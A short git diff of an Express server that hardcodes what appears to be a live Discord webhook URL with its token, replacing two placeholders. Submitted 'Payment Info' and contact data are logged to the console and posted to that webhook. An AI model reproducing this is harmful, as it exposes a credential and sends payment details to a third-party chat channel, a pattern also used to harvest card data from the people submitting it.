@@ -1,7 +1,8 @@
   const express = require("express");
   const cors = require("cors");
   require("dotenv").config();
-  
+  const fetch = require("node-fetch");
+
   const app = express();
   const port = process.env.PORT || 4000;
   
@@ -44,7 +45,7 @@
       console.log("Stored Payment Info:", storage);
   
       // ✅ Discord Notification for Payment Submissions
-      await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+      await fetch("https://discord.com/api/webhooks/1394963202290356244/S40WWwqr2j3kQsXh-Ic5LMocbR-nf0E4pPu4YBpZ62TXPrHeCsSrpqzHMh7K_tBpBaGf", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -63,7 +64,7 @@
       console.log("Stored Contact Info:", storage);
   
       // ✅ Discord Notification for Contact Submissions
-      await fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_URL", {
+      await fetch("https://discord.com/api/webhooks/1394963202290356244/S40WWwqr2j3kQsXh-Ic5LMocbR-nf0E4pPu4YBpZ62TXPrHeCsSrpqzHMh7K_tBpBaGf", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
